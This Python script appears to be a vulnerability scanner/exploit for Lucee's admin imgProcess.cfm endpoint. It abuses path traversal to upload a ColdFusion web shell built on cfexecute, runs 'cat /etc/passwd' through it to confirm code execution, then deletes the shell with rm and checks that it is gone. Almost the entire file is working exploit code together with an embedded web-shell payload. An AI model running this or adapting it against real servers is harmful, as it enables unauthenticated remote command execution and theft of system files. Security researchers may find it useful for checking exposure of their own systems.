import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
randname=randomLowercase(6)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"lucee/admin/imgProcess.cfm?file=/whatever"
	body="imgSrc=a"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"lucee/admin/imgProcess.cfm?file=/../../../context/"+randname+".cfm"
	body='''imgSrc=\r
<cfoutput>\r
\r
<table>\r
<form method="POST" action="">\r
<tr><td>Command:</td><td><input type=test name="cmd" size=50\r
<cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>\r
<tr><td>Options:</td><td> <input type=text name="opts" size=50\r
<cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>\r
<tr><td>Timeout:</td><td> <input type=text name="timeout" size=4\r
<cfif isdefined("form.timeout")>value="#form.timeout#"\r
<cfelse> value="5"</cfif>></td></tr>\r
</table>\r
<input type=submit value="Exec">\r
</form>\r
<cfif isdefined("form.cmd")>\r
<cfsavecontent variable="myVar">\r
<cfexecute name = "#Form.cmd#"\r
arguments = "#Form.opts#"\r
timeout = "#Form.timeout#">\r
</cfexecute>\r
</cfsavecontent>\r
<pre>\r
#HTMLCodeFormat(myVar)#\r
</pre>\r
</cfif>\r
</cfoutput>'''
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r1=True
	else:
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"lucee/"+randname+".cfm"
	body="cmd=cat /etc/passwd&opts=&timeout=5"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("root:[x*]:0:0:",response.text):
		r2=True
	else:
		r2=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"lucee/"+randname+".cfm"
	body="cmd=rm /opt/lucee/tomcat/webapps/ROOT/WEB-INF/lucee/context/"+randname+".cfm&opts=&timeout=5"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r3=True
	else:
		r3=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"lucee/"+randname+".cfm"
	body="cmd=id&opts=&timeout=5"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 404:
		r4=True
	else:
		r4=False
	if r0 and r1 and r2 and r3 and r4:
		return True
	else:
		return False
